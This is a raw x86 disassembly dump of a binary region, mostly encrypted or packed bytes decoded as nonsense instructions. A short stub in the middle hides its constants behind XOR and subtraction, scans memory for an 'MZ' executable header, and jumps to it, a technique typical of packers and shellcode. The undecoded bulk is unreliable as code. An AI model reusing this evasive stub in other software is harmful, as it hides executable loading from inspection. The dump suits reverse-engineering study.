  40bf1c:	jecxz  0x40beb9
  40bf1e:	lock and al,0xed
  40bf21:	sti    
  40bf22:	and    ebx,DWORD PTR [eax-0x35]
  40bf25:	inc    ecx
  40bf26:	loopne 0x40bf91
  40bf28:	imul   DWORD PTR [edx+0x1f]
  40bf2b:	(bad)  
  40bf2c:	call   0x100f5638
  40bf31:	xchg   esi,eax
  40bf32:	mov    esp,0x415b6e17
  40bf37:	and    eax,0xc9748bac
  40bf3c:	adc    DWORD PTR [edi],ebx
  40bf3e:	in     eax,0xf
  40bf40:	sub    dl,al
  40bf42:	dec    eax
  40bf43:	inc    esi
  40bf44:	ja     0x40bef3
  40bf46:	jo     0x40becd
  40bf48:	daa    
  40bf49:	xchg   ebp,eax
  40bf4a:	idiv   dh
  40bf4c:	dec    ecx
  40bf4d:	sub    BYTE PTR [esi+0x2213a629],al
  40bf53:	mov    es,WORD PTR [ebp+0x15844ada]
  40bf59:	fiadd  WORD PTR [edx+0x60]
  40bf5c:	js     0x40bfc8
  40bf5e:	ins    BYTE PTR es:[edi],dx
  40bf5f:	and    bl,BYTE PTR [edx+0x6c]
  40bf62:	fnstsw WORD PTR [eax+0x1e]
  40bf65:	lahf   
  40bf66:	xchg   esi,eax
  40bf67:	popf   
  40bf68:	stos   BYTE PTR es:[edi],al
  40bf69:	sbb    bh,dl
  40bf6b:	dec    ebx
  40bf6c:	pop    ds
  40bf6d:	dec    esi
  40bf6e:	sbb    DWORD PTR [edx-0x76],ebx
  40bf71:	mov    WORD PTR [ecx],fs
  40bf73:	jb     0x40bf42
  40bf75:	ds ds (bad) 
  40bf78:	in     eax,0xbd
  40bf7a:	sbb    al,0xae
  40bf7c:	or     eax,0x79ff431e
  40bf81:	cmp    eax,0x87e1819d
  40bf86:	push   eax
  40bf87:	mov    dh,0x8d
  40bf89:	fdivp  st(5),st
  40bf8b:	imul   ecx,DWORD PTR [ecx-0x4a],0x7c45ca51
  40bf92:	repz mov dl,0x6c
  40bf95:	adc    esi,eax
  40bf97:	mov    ecx,0x3813e132
  40bf9c:	test   BYTE PTR [eax+0x57],dh
  40bf9f:	out    dx,eax
  40bfa0:	lods   al,BYTE PTR ds:[esi]
  40bfa1:	sub    al,BYTE PTR [edi+0x3fe6cade]
  40bfa7:	adc    cl,BYTE PTR [ecx]
  40bfa9:	push   eax
  40bfaa:	test   BYTE PTR [ecx],dl
  40bfac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfad:	add    eax,0x5fc26cf1
  40bfb2:	push   ss
  40bfb3:	js     0x40bf93
  40bfb5:	or     al,0x88
  40bfb7:	jne    0x40bfcc
  40bfb9:	mov    edi,ebx
  40bfbb:	cwde   
  40bfbc:	stos   BYTE PTR es:[edi],al
  40bfbd:	jecxz  0x40bfcc
  40bfbf:	imul   ebx,DWORD PTR [edi],0x27
  40bfc2:	stos   DWORD PTR es:[edi],eax
  40bfc3:	jmp    0x18ad:0xbee27a15
  40bfca:	sub    esp,DWORD PTR [ebx+0x2bd75b47]
  40bfd0:	dec    esi
  40bfd1:	mov    edx,0x1122d213
  40bfd6:	in     al,dx
  40bfd7:	mov    cl,0x78
  40bfd9:	inc    edx
  40bfda:	int3   
  40bfdb:	aaa    
  40bfdc:	mov    dh,cl
  40bfde:	stos   DWORD PTR es:[edi],eax
  40bfdf:	pusha  
  40bfe0:	xlat   BYTE PTR ds:[ebx]
  40bfe1:	pop    ebp
  40bfe2:	fist   WORD PTR [eax-0x70a6d6ec]
  40bfe8:	jle    0x40bfaa
  40bfea:	shr    BYTE PTR [ebp+0x42757f29],cl
  40bff0:	outs   dx,DWORD PTR ds:[esi]
  40bff1:	fcom   QWORD PTR [edx+eax*1-0x7b]
  40bff5:	sti    
  40bff6:	test   edi,0x6c5f51da
  40bffc:	push   ss
  40bffd:	sub    al,0x9d
  40bfff:	not    DWORD PTR [ebx+0x1a9d09ce]
  40c005:	jae    0x40bfb7
  40c007:	imul   ebp,ebp,0x8dc4754f
  40c00d:	inc    edi
  40c00e:	sbb    eax,0x5ee200c0
  40c013:	inc    esi
  40c014:	sbb    eax,0xa632595
  40c019:	repnz shl edx,0xbd
  40c01d:	mov    dl,0xa0
  40c01f:	nop
  40c020:	add    BYTE PTR [eax+0x3],ah
  40c023:	clc    
  40c024:	gs xchg edi,eax
  40c026:	ss jp  0x40c021
  40c029:	mov    WORD PTR ds:0x8b533a7a,ds
  40c02f:	and    DWORD PTR [eax+0x545f10ab],esp
  40c035:	adc    eax,0x85da4d71
  40c03a:	loope  0x40bfe1
  40c03c:	repz sbb ah,BYTE PTR [ecx-0x47]
  40c040:	and    eax,0xcba8b6af
  40c045:	push   0xd851da33
  40c04a:	cmp    al,0xe3
  40c04c:	call   0xe4d8793b
  40c051:	pop    ebp
  40c052:	inc    edi
  40c053:	dec    edx
  40c054:	cmp    DWORD PTR ds:0x85d78ba7,edx
  40c05a:	rcr    esp,1
  40c05c:	cmc    
  40c05d:	push   ds
  40c05e:	xor    BYTE PTR [ebx+0x617601d6],dl
  40c064:	xchg   ebx,eax
  40c065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c066:	dec    esp
  40c067:	mov    ebp,0x36b05f02
  40c06c:	pusha  
  40c06d:	fdiv   st,st(1)
  40c06f:	mov    ebx,0x58568ba7
  40c074:	shr    BYTE PTR [edi+0x7d],0x32
  40c078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c079:	and    BYTE PTR [ebp-0x75],dh
  40c07c:	fwait
  40c07d:	mov    gs,esi
  40c07f:	dec    ebp
  40c080:	push   0xe3c2db31
  40c085:	jne    0x40c012
  40c087:	(bad)  
  40c089:	sub    cl,bh
  40c08b:	sti    
  40c08c:	pushf  
  40c08d:	fnstsw ax
  40c08f:	mov    al,0x4c
  40c091:	les    edx,FWORD PTR [ecx]
  40c093:	sub    eax,0x83afe355
  40c098:	das    
  40c099:	call   0xed4e:0xf2064419
  40c0a0:	jnp    0x40c101
  40c0a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0a3:	lods   al,BYTE PTR ds:[esi]
  40c0a4:	out    0xd1,al
  40c0a6:	das    
  40c0a7:	or     eax,0x7ed7ea9a
  40c0ac:	xor    BYTE PTR [esi],al
  40c0ae:	push   ebp
  40c0af:	mov    dh,BYTE PTR [ebx+0x30f30e66]
  40c0b5:	pop    ss
  40c0b6:	inc    ebx
  40c0b7:	call   0x2183:0xf0cd1abd
  40c0be:	add    DWORD PTR [esi],ebp
  40c0c0:	jecxz  0x40c062
  40c0c2:	jmp    DWORD PTR [eax+eiz*1+0x52]
  40c0c6:	dec    edx
  40c0c7:	daa    
  40c0c8:	mov    al,0x91
  40c0ca:	xchg   ecx,eax
  40c0cb:	lock lock inc edx
  40c0ce:	jmp    0xb003b8d7
  40c0d3:	imul   edx,DWORD PTR [ecx],0x32
  40c0d6:	push   ss
  40c0d7:	stos   BYTE PTR es:[edi],al
  40c0d8:	aas    
  40c0d9:	mov    DWORD PTR [edi+0x21c54af3],ebp
  40c0df:	rcl    edx,0x7
  40c0e2:	repz jle 0x40c124
  40c0e5:	xchg   ebx,eax
  40c0e6:	sbb    ah,0xa1
  40c0e9:	iret   
  40c0ea:	jbe    0x40c156
  40c0ec:	nop
  40c0ed:	aad    0xb1
  40c0ef:	or     ebx,esi
  40c0f1:	adc    ah,BYTE PTR [ebx-0x6105acd3]
  40c0f7:	lds    esp,FWORD PTR [ebx-0x842fd89]
  40c0fd:	push   eax
  40c0fe:	jne    0x40c0dd
  40c100:	xchg   al,ah
  40c102:	retf   
  40c103:	xor    eax,DWORD PTR [edx]
  40c105:	or     DWORD PTR [edx],edi
  40c107:	adc    al,0x41
  40c109:	out    dx,al
  40c10a:	stos   BYTE PTR es:[edi],al
  40c10b:	jle    0x40c0f9
  40c10d:	or     eax,DWORD PTR [ebx]
  40c10f:	and    DWORD PTR [ebp-0x39],0xffffffa3
  40c113:	cmp    eax,0x6d980eee
  40c118:	xchg   esp,eax
  40c119:	sbb    dl,BYTE PTR [edx-0x4a9d8edc]
  40c11f:	pop    esp
  40c120:	and    ch,BYTE PTR [ebp+0x69b1f22b]
  40c126:	add    al,0xb8
  40c128:	mov    bh,0xaf
  40c12a:	xchg   edx,eax
  40c12b:	add    al,0xdd
  40c12d:	inc    eax
  40c12e:	lock out dx,eax
  40c130:	adc    WORD PTR [edx],bx
  40c133:	cwde   
  40c134:	push   ss
  40c135:	sbb    ebp,esp
  40c137:	mov    ss,WORD PTR [ebx+0x42]
  40c13a:	lods   eax,DWORD PTR ds:[esi]
  40c13b:	in     eax,0xdc
  40c13d:	xor    DWORD PTR [edi],esp
  40c13f:	sub    ecx,DWORD PTR [edx-0x302bf48e]
  40c145:	cmc    
  40c146:	cmp    eax,0xdbd2f245
  40c14b:	fisttp QWORD PTR [ebx]
  40c14d:	pop    esp
  40c14e:	dec    ecx
  40c14f:	mov    bl,0x56
  40c151:	sti    
  40c152:	fidivr DWORD PTR [ebx+0x23ff4e6c]
  40c158:	fidiv  WORD PTR [ebx+ebp*2]
  40c15b:	xchg   esi,eax
  40c15c:	pop    es
  40c15d:	(bad)  
  40c15f:	int    0x29
  40c161:	cmc    
  40c162:	jo     0x40c134
  40c164:	ror    DWORD PTR [esi+0x6af9cc8b],1
  40c16a:	add    BYTE PTR [edi],0x6b
  40c16d:	xchg   ecx,eax
  40c16e:	test   eax,0x265e7e81
  40c173:	xor    al,0xe6
  40c175:	inc    ebp
  40c176:	adc    BYTE PTR [ecx],0xe9
  40c179:	repz push edx
  40c17b:	test   eax,0xc219e4d4
  40c180:	cmp    ecx,ebx
  40c182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c183:	cmp    BYTE PTR [ebx+edi*4],bh
  40c186:	xchg   ebx,eax
  40c187:	cs icebp 
  40c189:	mov    ebp,0x94c46ed
  40c18e:	ja     0x40c1ea
  40c190:	cmp    bl,BYTE PTR [eax-0x47bf672b]
  40c196:	jnp    0x40c15a
  40c198:	and    BYTE PTR ds:0x865fe3c7,al
  40c19e:	sbb    ebp,eax
  40c1a0:	dec    ecx
  40c1a1:	lahf   
  40c1a2:	xchg   ebp,eax
  40c1a3:	sbb    al,0xc3
  40c1a5:	sar    DWORD PTR [eax+0x2eef72e7],1
  40c1ab:	jecxz  0x40c20d
  40c1ad:	ror    BYTE PTR [esp+eiz*4-0x27dafe6f],cl
  40c1b4:	inc    eax
  40c1b5:	mov    edx,0x1129bd9
  40c1ba:	xchg   ebx,eax
  40c1bb:	pop    eax
  40c1bc:	xchg   esp,eax
  40c1bd:	mov    ecx,0xeee2ea3c
  40c1c2:	cs ss dec esp
  40c1c5:	mov    ch,0x53
  40c1c7:	stos   DWORD PTR es:[edi],eax
  40c1c8:	mov    bh,0x80
  40c1ca:	push   edi
  40c1cb:	jb     0x40c182
  40c1cd:	pop    esp
  40c1ce:	or     eax,0x3cf1a48
  40c1d3:	imul   edx,DWORD PTR [eax],0x43
  40c1d6:	imul   ebp,DWORD PTR [edx+0x28],0x9e1d89c6
  40c1dd:	out    dx,eax
  40c1de:	and    ah,BYTE PTR [eax]
  40c1e0:	(bad)  
  40c1e1:	dec    edi
  40c1e2:	mov    cl,0x92
  40c1e4:	cmp    eax,0x3bda18e1
  40c1e9:	xor    DWORD PTR [ebp+0x7c],esp
  40c1ec:	sub    BYTE PTR [esi+0x2f],ch
  40c1ef:	aad    0xb3
  40c1f1:	inc    ebp
  40c1f2:	pop    esi
  40c1f3:	xchg   esi,eax
  40c1f4:	aam    0x79
  40c1f6:	push   cs
  40c1f7:	jge    0x40c203
  40c1f9:	inc    ebp
  40c1fa:	hlt    
  40c1fb:	in     al,dx
  40c1fc:	pop    esi
  40c1fd:	loope  0x40c192
  40c1ff:	mov    bl,0x75
  40c201:	pop    ebx
  40c202:	loopne 0x40c210
  40c204:	dec    edx
  40c206:	jae    0x40c26a
  40c208:	push   ebp
  40c209:	test   BYTE PTR [ecx+edx*2+0xf],ah
  40c20d:	and    eax,0xe6b7cce9
  40c212:	mov    dl,0x3a
  40c214:	clc    
  40c215:	cwde   
  40c216:	mov    ds:0x4f76c2c7,al
  40c21b:	mov    bl,0xfd
  40c21d:	sub    ebp,DWORD PTR [edi-0x17]
  40c220:	fistp  QWORD PTR [si]
  40c223:	push   esi
  40c224:	xor    al,0xaa
  40c226:	mov    ebp,0x8df26e9d
  40c22b:	cld    
  40c22c:	ret    0xee09
  40c22f:	lods   al,BYTE PTR ds:[esi]
  40c230:	inc    ebp
  40c231:	jp     0x40c27c
  40c233:	out    dx,eax
  40c234:	cmp    eax,0x6630e993
  40c239:	inc    edi
  40c23a:	fsubr  st,st(3)
  40c23c:	sbb    BYTE PTR [eax-0xfc91ad9],0x9e
  40c243:	cmp    bl,BYTE PTR [ebp+0x4f22bf6e]
  40c249:	dec    ebx
  40c24a:	mov    ebx,0xa742dad3
  40c24f:	inc    ebx
  40c250:	daa    
  40c251:	or     bl,bh
  40c253:	leave  
  40c254:	data16 mov dl,0x95
  40c257:	loop   0x40c1fe
  40c259:	rol    DWORD PTR [edi],1
  40c25b:	sub    BYTE PTR [ebx+0x2b7cee10],ch
  40c261:	jbe    0x40c2cd
  40c263:	ror    BYTE PTR [edi-0x6efefd27],0x5a
  40c26a:	call   0x458c97e7
  40c26f:	and    edi,DWORD PTR [edx+0x331ad674]
  40c275:	mov    edx,0x5f8e8ee6
  40c27a:	jno    0x40c2bc
  40c27c:	add    eax,0xf3b832ca
  40c281:	ret    
  40c282:	mov    ch,ah
  40c284:	out    dx,eax
  40c285:	into   
  40c286:	(bad)  
  40c287:	dec    ecx
  40c288:	dec    esi
  40c289:	inc    eax
  40c28a:	lock jl 0x40c2a8
  40c28d:	mov    edi,DWORD PTR [ebx]
  40c28f:	dec    esp
  40c290:	cmp    eax,0x75f4aea
  40c295:	fcomp  DWORD PTR [eax+0x3d1925a8]
  40c29b:	mov    ch,0xee
  40c29d:	adc    dh,0xdd
  40c2a0:	pop    ds
  40c2a1:	or     DWORD PTR [eax+edx*1-0x7a],0xffffffa3
  40c2a6:	mov    eax,ds:0xf2ba3659
  40c2ab:	mov    edi,esi
  40c2ad:	js     0x40c263
  40c2af:	test   ah,dl
  40c2b1:	fldenv [esi]
  40c2b3:	push   edi
  40c2b4:	jns    0x40c31e
  40c2b6:	sti    
  40c2b7:	jg     0x40c31f
  40c2b9:	int3   
  40c2ba:	dec    BYTE PTR [edi]
  40c2bc:	mov    eax,ds:0xf022d967
  40c2c1:	out    0x5f,eax
  40c2c3:	nop
  40c2c4:	pop    es
  40c2c5:	cld    
  40c2c6:	and    al,0x17
  40c2c8:	xchg   edi,eax
  40c2c9:	sbb    al,0x46
  40c2cb:	mov    bl,0x12
  40c2cd:	cmc    
  40c2ce:	sub    al,0x31
  40c2d0:	je     0x40c323
  40c2d2:	sub    eax,DWORD PTR [ebx+0x824f8e6]
  40c2d8:	ret    0x2fd3
  40c2db:	xchg   DWORD PTR [ebx-0x2e84e53d],ebp
  40c2e1:	test   DWORD PTR [ebx+0x63],edx
  40c2e4:	addr16 pusha 
  40c2e6:	sbb    eax,0xb4019a1a
  40c2eb:	popa   
  40c2ec:	xor    BYTE PTR [edx+0x13],bl
  40c2ef:	fisub  WORD PTR [ebx+0x23]
  40c2f2:	jl     0x40c341
  40c2f4:	aam    0xd9
  40c2f6:	xchg   esi,eax
  40c2f7:	add    al,0x9c
  40c2f9:	mov    ebp,0x9ed3f34f
  40c2fe:	pop    edi
  40c2ff:	dec    edi
  40c300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c301:	cmp    cl,0x25
  40c304:	push   cs
  40c305:	aaa    
  40c306:	mov    ebx,0x75983f56
  40c30b:	imul   edx
  40c30d:	sti    
  40c30e:	ss add eax,0x45270e23
  40c314:	lea    ebp,[ebx-0x3fe2c4ec]
  40c31a:	lds    esp,FWORD PTR [edx]
  40c31c:	call   0x7d3cf6f8
  40c321:	push   0xc5440cf8
  40c326:	aaa    
  40c327:	pop    esp
  40c328:	scas   al,BYTE PTR es:[edi]
  40c329:	mov    ebp,0x7deb3fe5
  40c32e:	xor    edx,ecx
  40c330:	div    DWORD PTR [eax]
  40c332:	xlat   BYTE PTR ds:[ebx]
  40c333:	out    0x70,al
  40c335:	mov    dl,0x7b
  40c337:	inc    ebp
  40c338:	mov    esp,es
  40c33a:	ss jne 0x40c31a
  40c33d:	(bad)  
  40c33e:	out    0xcf,al
  40c340:	mov    dh,0xb2
  40c342:	and    eax,0x1dc3e9e4
  40c347:	xchg   esp,eax
  40c348:	xchg   edx,eax
  40c349:	inc    ebx
  40c34a:	cs das 
  40c34c:	and    DWORD PTR [esi-0xf55bad9],edi
  40c352:	mov    ah,0xc5
  40c354:	xchg   ebp,eax
  40c355:	arpl   WORD PTR [ebx],bx
  40c357:	mov    eax,ds:0x8004bd8
  40c35c:	les    esi,FWORD PTR [edi-0x79]
  40c35f:	sti    
  40c360:	mov    esp,DWORD PTR [ecx]
  40c362:	xor    cl,BYTE PTR [ecx+0x44]
  40c365:	rol    DWORD PTR [ebx],0xa6
  40c368:	sub    DWORD PTR [eax],ebp
  40c36a:	jnp    0x40c315
  40c36c:	inc    esp
  40c36d:	sahf   
  40c36e:	jg     0x40c385
  40c370:	push   0x1d8b3d84
  40c375:	lahf   
  40c376:	stc    
  40c377:	lds    esp,FWORD PTR [eax]
  40c379:	xchg   cl,dh
  40c37b:	outs   dx,BYTE PTR ds:[esi]
  40c37c:	adc    al,0x56
  40c37e:	das    
  40c37f:	mov    dh,bl
  40c381:	inc    edx
  40c382:	jmp    0xb261:0x5d493dba
  40c389:	stos   DWORD PTR es:[edi],eax
  40c38a:	shl    BYTE PTR [edx+0x4e],0x5c
  40c38e:	cmc    
  40c38f:	pop    ss
  40c390:	mov    gs,WORD PTR [edx]
  40c392:	inc    ebp
  40c393:	fsub   DWORD PTR [ecx+0x25]
  40c396:	mov    esi,0x7ceea19f
  40c39b:	fmul   QWORD PTR [edx+0x4171609e]
  40c3a1:	scas   al,BYTE PTR es:[edi]
  40c3a2:	mov    edi,DWORD PTR [esi+0xa]
  40c3a5:	mov    ah,0xbc
  40c3a7:	arpl   ax,bp
  40c3a9:	mov    bl,0xdb
  40c3ab:	cmp    ebp,edi
  40c3ad:	jle    0x40c416
  40c3af:	out    0x41,eax
  40c3b1:	inc    ah
  40c3b3:	pop    es
  40c3b4:	xor    esp,DWORD PTR [edx+0x1a]
  40c3b7:	out    dx,al
  40c3b8:	xchg   esi,eax
  40c3b9:	mov    cl,BYTE PTR [ebp-0x56]
  40c3bc:	ror    BYTE PTR [eax-0x3f97eca9],cl
  40c3c2:	add    BYTE PTR [ebx],0x6f
  40c3c5:	imul   edi,DWORD PTR [eax+0x40],0x11f58478
  40c3cc:	and    eax,0x707201c
  40c3d1:	(bad)  
  40c3d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3d3:	or     DWORD PTR [eax],esi
  40c3d5:	in     eax,0x35
  40c3d7:	or     eax,0x253fff68
  40c3dc:	fnstenv [edi+0x3c]
  40c3df:	mov    al,0x74
  40c3e1:	mov    ecx,0xa253f57a
  40c3e6:	mov    al,ds:0xfbfc78d8
  40c3eb:	mov    BYTE PTR [ebx+0x53],ch
  40c3ee:	xchg   edx,eax
  40c3ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3f0:	add    al,0x70
  40c3f2:	dec    esp
  40c3f3:	mov    ebp,edx
  40c3f5:	pop    es
  40c3f6:	and    ch,dl
  40c3f8:	or     DWORD PTR [edi-0x2c],ebp
  40c3fb:	ins    BYTE PTR es:[edi],dx
  40c3fc:	mov    ds:0xe5bcf0d6,al
  40c401:	xor    DWORD PTR [edx-0x6fd55646],0x27
  40c408:	rol    BYTE PTR [edi-0x4a812c93],1
  40c40e:	shr    BYTE PTR [ecx-0x12],cl
  40c411:	sbb    bh,dl
  40c413:	popa   
  40c414:	push   0x1d
  40c416:	sbb    esp,DWORD PTR ds:0x2f7f35e9
  40c41c:	(bad)  
  40c41d:	adc    eax,0xd0e7eab6
  40c422:	fdivr  DWORD PTR [esi]
  40c424:	fldcw  WORD PTR [esi-0x13adc173]
  40c42a:	rcl    DWORD PTR [eax],1
  40c42c:	jnp    0x40c41d
  40c42e:	mov    al,ds:0x1800261e
  40c433:	das    
  40c434:	mov    dh,BYTE PTR [edi-0x2a]
  40c437:	pop    ecx
  40c438:	inc    ebp
  40c439:	out    0x11,eax
  40c43b:	das    
  40c43c:	inc    ebx
  40c43d:	cmp    eax,0xca4c5ef9
  40c442:	adc    edx,DWORD PTR [edi-0x3]
  40c445:	xchg   ebx,eax
  40c446:	(bad)  
  40c447:	(bad)  
  40c448:	mov    edi,0xdd576c44
  40c44d:	fdivr  DWORD PTR [ebp+0x44]
  40c450:	lds    eax,FWORD PTR [esi]
  40c452:	xor    al,ah
  40c454:	arpl   bp,dx
  40c456:	loope  0x40c442
  40c458:	fcmovne st,st(7)
  40c45a:	dec    eax
  40c45b:	xor    ecx,DWORD PTR [ebx-0x5752fa7b]
  40c461:	jnp    0x40c495
  40c463:	xor    BYTE PTR [ebp-0x5d],ch
  40c466:	push   ss
  40c467:	adc    DWORD PTR [ebx+edi*1-0x3ea1558f],esp
  40c46e:	cmp    DWORD PTR [ebx-0x16],eax
  40c471:	or     ebx,edi
  40c473:	sbb    BYTE PTR [ebx*1+0x56eb0791],al
  40c47a:	and    al,0x27
  40c47c:	(bad)  
  40c47d:	sbb    eax,0xa3e5b209
  40c482:	arpl   si,cx
  40c484:	test   DWORD PTR [edx-0x2],0xa22de795
  40c48b:	sbb    eax,0xd2b7d829
  40c490:	xchg   edx,eax
  40c491:	jge    0x40c45c
  40c493:	out    dx,eax
  40c494:	adc    eax,0xe8854a5
  40c499:	mov    dh,0x8d
  40c49b:	push   eax
  40c49c:	ins    DWORD PTR es:[edi],dx
  40c49d:	or     dl,BYTE PTR [esi+ecx*8-0x18]
  40c4a1:	mov    al,0x70
  40c4a3:	xor    eax,0x27274406
  40c4a8:	cs push edx
  40c4aa:	pushf  
  40c4ab:	push   ss
  40c4ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4ad:	xor    bh,BYTE PTR [ebx+eiz*8-0x31]
  40c4b1:	xchg   BYTE PTR [eax],al
  40c4b3:	ds pop ebx
  40c4b5:	mov    BYTE PTR ds:0x5ff65a18,bh
  40c4bb:	fldenv [ecx+edi*4]
  40c4be:	clc    
  40c4bf:	out    dx,al
  40c4c0:	jae    0x40c4df
  40c4c2:	jmp    0xffc0:0x11731a72
  40c4c9:	ins    BYTE PTR es:[edi],dx
  40c4ca:	sbb    eax,0xbdbb60c9
  40c4cf:	pop    esi
  40c4d0:	jp     0x40c4f6
  40c4d2:	add    BYTE PTR [ebp-0x15b889b2],cl
  40c4d8:	out    0xb9,al
  40c4da:	nop
  40c4db:	add    DWORD PTR [eax-0x18],ebx
  40c4de:	(bad)  
  40c4e0:	cwde   
  40c4e1:	mov    dl,0x35
  40c4e3:	mov    ebx,0xa6663e41
  40c4e8:	call   0xe8c6297a
  40c4ed:	lods   al,BYTE PTR ds:[esi]
  40c4ee:	sub    DWORD PTR [edi],edx
  40c4f0:	repz imul ebp,DWORD PTR [edi],0x53597647
  40c4f7:	jmp    0x5b75:0x4b09a02e
  40c4fe:	pop    ecx
  40c4ff:	cld    
  40c500:	pop    fs
  40c502:	dec    edi
  40c503:	call   DWORD PTR [edi]
  40c505:	fidiv  DWORD PTR [edi]
  40c507:	test   al,0x1d
  40c509:	jmp    0x40c589
  40c50b:	inc    edx
  40c50c:	ror    DWORD PTR [edi-0x5d3388f1],1
  40c512:	test   BYTE PTR [ebx],dl
  40c514:	pushf  
  40c515:	adc    ebx,DWORD PTR [esi-0x4263844]
  40c51b:	call   0xd0e517da
  40c520:	cmc    
  40c521:	js     0x40c4da
  40c523:	xor    al,0xcb
  40c525:	push   edx
  40c526:	jb     0x40c556
  40c528:	mov    edx,0xd9e88668
  40c52d:	push   ds
  40c52e:	fisttp DWORD PTR [edi]
  40c530:	ins    BYTE PTR es:[edi],dx
  40c531:	mov    ebx,0x803ecb59
  40c536:	adc    DWORD PTR [ebp-0x4f],esi
  40c539:	xchg   edx,eax
  40c53a:	sub    ah,BYTE PTR [esi+0x35]
  40c53d:	aam    0x91
  40c53f:	jnp    0x40c4ee
  40c541:	inc    ebp
  40c542:	or     eax,0xacc92c3e
  40c547:	rcr    BYTE PTR [esi+0x50adce26],cl
  40c54d:	cli    
  40c54e:	mov    esp,0xb0caa2ea
  40c553:	mov    ds:0x4eebebdf,eax
  40c558:	sahf   
  40c559:	pushf  
  40c55a:	xchg   esi,eax
  40c55b:	inc    ecx
  40c55c:	mov    ds:0x11e45f04,eax
  40c561:	xchg   esi,eax
  40c562:	in     al,0x45
  40c564:	out    0xb9,al
  40c566:	std    
  40c567:	sub    BYTE PTR [eax],bh
  40c569:	(bad)  
  40c56b:	and    ecx,DWORD PTR [ecx-0x20]
  40c56e:	lock ja 0x40c56e
  40c571:	add    BYTE PTR [edi-0x6b1be215],bh
  40c577:	lods   al,BYTE PTR ds:[esi]
  40c578:	aad    0x7d
  40c57a:	sbb    BYTE PTR [edx+0x1e87c7b9],dh
  40c580:	pop    ebp
  40c581:	inc    esi
  40c582:	push   ss
  40c583:	adc    al,0xfd
  40c585:	jno    0x40c5df
  40c587:	mov    esp,0xdc2b361d
  40c58c:	es jle 0x40c592
  40c58f:	cmp    BYTE PTR [ecx+0x458bf87d],cl
  40c595:	or     al,0x8b
  40c597:	jge    0x40c5a5
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0xa74b873c
  40c65b:	and    eax,0xe0a2cb4e
  40c660:	jl     0x40c6de
  40c662:	dec    esi
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	sub    edi,DWORD PTR [ecx+0x1ee3ef1c]
  40c66c:	mov    ds:0xbda8a69e,al
  40c671:	in     al,0xae
  40c673:	inc    eax
  40c674:	jmp    0x40c64a
  40c676:	dec    eax
  40c677:	pop    ecx
  40c678:	adc    DWORD PTR ds:0xad311a55,0x23
  40c67f:	jo     0x40c63a
  40c681:	and    ah,0x99
  40c684:	or     al,0xd4
  40c686:	popf   
  40c687:	push   esp
  40c688:	ror    BYTE PTR [ebx+ecx*4],cl
  40c68b:	sub    BYTE PTR [edx],ch
  40c68d:	outs   dx,BYTE PTR ds:[esi]
  40c68e:	sbb    DWORD PTR [ebx],ecx
  40c690:	mov    fs,WORD PTR [esi]
  40c692:	ret    
  40c693:	push   esp
  40c694:	daa    
  40c695:	pop    ss
  40c696:	inc    edi
  40c697:	mov    bh,0x42
  40c699:	inc    ebp
  40c69a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c69b:	sbb    eax,0xb99667d6
  40c6a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6a1:	cmc    
  40c6a2:	push   ds
  40c6a3:	push   cs
  40c6a4:	pop    ecx
  40c6a5:	jnp    0x40c641
  40c6a7:	jmp    0x40c723
  40c6a9:	stc    
  40c6aa:	aaa    
  40c6ab:	mov    ebp,0x592091eb
  40c6b0:	inc    edx
  40c6b1:	lea    eax,[eax+0x1a8d31e0]
  40c6b7:	and    eax,0x7747ca82
